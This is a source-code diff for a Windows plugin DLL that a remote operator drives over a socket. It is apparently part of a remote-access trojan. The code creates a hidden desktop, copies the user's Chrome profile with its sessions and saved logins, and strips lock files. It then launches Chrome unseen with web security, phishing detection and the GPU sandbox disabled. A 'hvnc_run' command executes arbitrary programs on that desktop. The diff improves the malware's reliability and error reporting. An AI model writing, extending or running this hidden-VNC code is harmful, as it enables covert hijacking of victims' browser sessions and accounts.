@@ -7,6 +7,7 @@
 #include <shlobj.h>
 #include <shellapi.h>
 #include <shlwapi.h>
+#include <objbase.h>
 #include <propidl.h>
 #include <gdiplus.h>
 #include <objidl.h>
@@ -1139,6 +1140,16 @@ static wstring utf8_to_wstring(const string& str) {
     return res;
 }
 
+static string wstring_to_utf8(const wstring& wstr) {
+    if (wstr.empty()) return string();
+    int size = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, NULL, 0, NULL, NULL);
+    if (size <= 0) return string();
+    string res(size, 0);
+    WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, &res[0], size, NULL, NULL);
+    if (!res.empty() && res.back() == '\0') res.pop_back();
+    return res;
+}
+
 static bool copy_directory(const wstring& source, const wstring& destination) {
     vector<wchar_t> from;
     from.assign(source.begin(), source.end());
@@ -1175,9 +1186,10 @@ static void delete_lock_files(const wstring& directory) {
         if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
             delete_lock_files(fullPath);
         } else {
-            if (wcsstr(findData.cFileName, L"SingletonLock") ||
-                wcsstr(findData.cFileName, L"Parent.lock") ||
+            if (wcsstr(findData.cFileName, L"Singleton") ||
+                wcsstr(findData.cFileName, L".lock") ||
                 wcsstr(findData.cFileName, L"lockfile")) {
+                SetFileAttributesW(fullPath.c_str(), FILE_ATTRIBUTE_NORMAL);
                 DeleteFileW(fullPath.c_str());
             }
         }
@@ -1188,60 +1200,65 @@ static void delete_lock_files(const wstring& directory) {
 static wstring get_chrome_path() {
     wstring path;
     HKEY hKey;
-    // 1. HKLM App Paths
-    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
-        WCHAR szPath[MAX_PATH];
-        DWORD cbData = sizeof(szPath);
-        if (RegQueryValueExW(hKey, NULL, NULL, NULL, (LPBYTE)szPath, &cbData) == ERROR_SUCCESS) {
-            path = szPath;
+    LPCWSTR keys[] = {
+        L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe",
+        L"SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe"
+    };
+    HKEY roots[] = { HKEY_LOCAL_MACHINE, HKEY_CURRENT_USER };
+
+    for (auto root : roots) {
+        for (auto keyStr : keys) {
+            if (RegOpenKeyExW(root, keyStr, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+                WCHAR szPath[MAX_PATH];
+                memset(szPath, 0, sizeof(szPath));
+                DWORD cbData = sizeof(szPath) - sizeof(WCHAR);
+                if (RegQueryValueExW(hKey, NULL, NULL, NULL, (LPBYTE)szPath, &cbData) == ERROR_SUCCESS) {
+                    path = szPath;
+                }
+                RegCloseKey(hKey);
+
+                if (!path.empty()) {
+                    if (path[0] == L'\"') {
+                        path.erase(0, 1);
+                        if (!path.empty() && path.back() == L'\"') path.pop_back();
+                    }
+                    if (PathFileExistsW(path.c_str())) return path;
+                }
+            }
         }
-        RegCloseKey(hKey);
-    }
-    if (!path.empty() && PathFileExistsW(path.c_str())) return path;
-
-    // 2. HKCU App Paths
-    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
-        WCHAR szPath[MAX_PATH];
-        DWORD cbData = sizeof(szPath);
-        if (RegQueryValueExW(hKey, NULL, NULL, NULL, (LPBYTE)szPath, &cbData) == ERROR_SUCCESS) {
-            path = szPath;
-        }
-        RegCloseKey(hKey);
-    }
-    if (!path.empty() && PathFileExistsW(path.c_str())) return path;
-
-    // 3. Environment variables (W6432)
-    WCHAR programW6432[MAX_PATH];
-    if (GetEnvironmentVariableW(L"ProgramW6432", programW6432, MAX_PATH) > 0) {
-        path = wstring(programW6432) + L"\\Google\\Chrome\\Application\\chrome.exe";
-        if (PathFileExistsW(path.c_str())) return path;
     }
 
-    // 4. Standard CSIDL locations
+    // Fallbacks
     WCHAR buffer[MAX_PATH];
     if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_PROGRAM_FILES, NULL, 0, buffer))) {
-        path = wstring(buffer) + L"\\Google\\Chrome\\Application\\chrome.exe";
-        if (PathFileExistsW(path.c_str())) return path;
+        wstring p = wstring(buffer) + L"\\Google\\Chrome\\Application\\chrome.exe";
+        if (PathFileExistsW(p.c_str())) return p;
     }
     if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_PROGRAM_FILESX86, NULL, 0, buffer))) {
-        path = wstring(buffer) + L"\\Google\\Chrome\\Application\\chrome.exe";
-        if (PathFileExistsW(path.c_str())) return path;
+        wstring p = wstring(buffer) + L"\\Google\\Chrome\\Application\\chrome.exe";
+        if (PathFileExistsW(p.c_str())) return p;
     }
     if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, buffer))) {
-        path = wstring(buffer) + L"\\Google\\Chrome\\Application\\chrome.exe";
-        if (PathFileExistsW(path.c_str())) return path;
+        wstring p = wstring(buffer) + L"\\Google\\Chrome\\Application\\chrome.exe";
+        if (PathFileExistsW(p.c_str())) return p;
     }
 
     return L"";
 }
 
 static void launch_browser_thread(string browserName) {
+    CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
     ensure_desktop();
-    if (!g_hHiddenDesktop) return;
+    if (!g_hHiddenDesktop) {
+        send_error("Failed to create/open hidden desktop. Error: " + to_string(GetLastError()));
+        CoUninitialize();
+        return;
+    }
 
     WCHAR appData[MAX_PATH];
     if (FAILED(SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appData))) {
         send_error("Failed to get LOCAL_APPDATA path.");
+        CoUninitialize();
         return;
     }
 
@@ -1251,13 +1268,17 @@ static void launch_browser_thread(string browserName) {
         sourceProfile = wstring(appData) + L"\\Google\\Chrome\\User Data";
         chromePath = get_chrome_path();
     } else {
+        CoUninitialize();
         return;
     }
 
     if (chromePath.empty() || !PathFileExistsW(chromePath.c_str())) {
         send_error("Browser executable (chrome.exe) not found in standard paths or registry.");
+        CoUninitialize();
         return;
     }
+
+    send_status("Detected Chrome path: " + wstring_to_utf8(chromePath));
 
     WCHAR tempPath[MAX_PATH];
     GetTempPathW(MAX_PATH, tempPath);
@@ -1267,13 +1288,13 @@ static void launch_browser_thread(string browserName) {
     wstring destProfile = uniqueProfile;
 
     if (PathFileExistsW(sourceProfile.c_str())) {
-        send_status("Cloning profile (this may take a while)...");
+        send_status("Cloning profile: " + wstring_to_utf8(sourceProfile));
         if (!copy_directory(sourceProfile, destProfile)) {
-            send_status("Profile cloning partially failed (some files may be locked), but attempting to start anyway...");
+            send_status("Profile cloning partially failed (some files may be locked). Attempting to fix...");
         }
         delete_lock_files(destProfile);
     } else {
-        send_status("Source profile not found. Starting with a fresh profile.");
+        send_status("Source profile not found at " + wstring_to_utf8(sourceProfile) + ". Using fresh profile.");
     }
 
     // Comprehensive flags to ensure Chrome starts on a hidden desktop and avoids GPU-related crashes
@@ -1309,7 +1330,22 @@ static void launch_browser_thread(string browserName) {
         L"--disable-web-security "
         L"--no-pings "
         L"--no-proxy-server "
-        L"--remote-debugging-port=0";
+        L"--remote-debugging-port=0 "
+        L"--disable-gpu-compositing "
+        L"--disable-background-timer-throttling "
+        L"--disable-client-side-phishing-detection "
+        L"--disable-default-apps "
+        L"--disable-hang-monitor "
+        L"--disable-popup-blocking "
+        L"--disable-prompt-on-repost "
+        L"--disable-sync "
+        L"--disable-web-resources "
+        L"--enable-automation "
+        L"--force-fieldtrials=SiteIsolationExtensions/Control "
+        L"--log-level=3 "
+        L"--no-first-run "
+        L"--no-zygote "
+        L"--disable-gpu-sandbox";
 
     vector<wchar_t> cmdLineBuf(cmdLine.begin(), cmdLine.end());
     cmdLineBuf.push_back(L'\0');
@@ -1331,8 +1367,10 @@ static void launch_browser_thread(string browserName) {
     PROCESS_INFORMATION pi;
     memset(&pi, 0, sizeof(pi));
 
-    // Removing CREATE_NEW_CONSOLE as Chrome is a GUI app and it might interfere with session attachment
-    if (CreateProcessW(NULL, cmdLineBuf.data(), NULL, NULL, FALSE, 0, NULL, chromeDir.c_str(), &si, &pi)) {
+    send_status("Full Command: " + wstring_to_utf8(cmdLine));
+    send_status("Launching Chrome...");
+
+    if (CreateProcessW(NULL, cmdLineBuf.data(), NULL, NULL, FALSE, CREATE_UNICODE_ENVIRONMENT | CREATE_BREAKAWAY_FROM_JOB, NULL, chromeDir.c_str(), &si, &pi)) {
         CloseHandle(pi.hProcess);
         CloseHandle(pi.hThread);
         g_forceFullFrame = true;
@@ -1340,6 +1378,7 @@ static void launch_browser_thread(string browserName) {
     } else {
         send_error("Failed to create Chrome process. Error: " + to_string(GetLastError()));
     }
+    CoUninitialize();
 }
 
 extern "C" __declspec(dllexport) void RunPlugin(SOCKET sock) {
@@ -1404,21 +1443,28 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
             g_forceFullFrame = true;
         } else if (action == "hvnc_run") {
             ensure_desktop();
-            if (!g_hHiddenDesktop) return;
+            if (!g_hHiddenDesktop) {
+                send_error("Failed to open/create hidden desktop.");
+                return;
+            }
 
             wstring path = utf8_to_wstring(cmd.value("path", "cmd.exe"));
             vector<wchar_t> cmdLine(path.begin(), path.end());
             cmdLine.push_back(L'\0');
 
-            wstring fullDesktopName = L"WinSta0\\" + g_desktopName;
-            STARTUPINFOW si = { sizeof(si) };
-            si.lpDesktop    = (LPWSTR)fullDesktopName.c_str();
-            si.dwFlags      = STARTF_USESHOWWINDOW;
-            si.wShowWindow  = SW_SHOW;
+    wstring fullDesktopName = L"WinSta0\\" + g_desktopName;
+    STARTUPINFOW si;
+    memset(&si, 0, sizeof(si));
+    si.cb = sizeof(si);
+    si.lpDesktop = (LPWSTR)fullDesktopName.c_str();
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_SHOW;
 
-            PROCESS_INFORMATION pi = { 0 };
+            PROCESS_INFORMATION pi;
+            memset(&pi, 0, sizeof(pi));
+
             if (CreateProcessW(NULL, cmdLine.data(), NULL, NULL, FALSE,
-                               CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
+                               CREATE_NEW_CONSOLE | CREATE_UNICODE_ENVIRONMENT | CREATE_BREAKAWAY_FROM_JOB, NULL, NULL, &si, &pi)) {
                 CloseHandle(pi.hProcess);
                 CloseHandle(pi.hThread);
                 g_forceFullFrame = true;
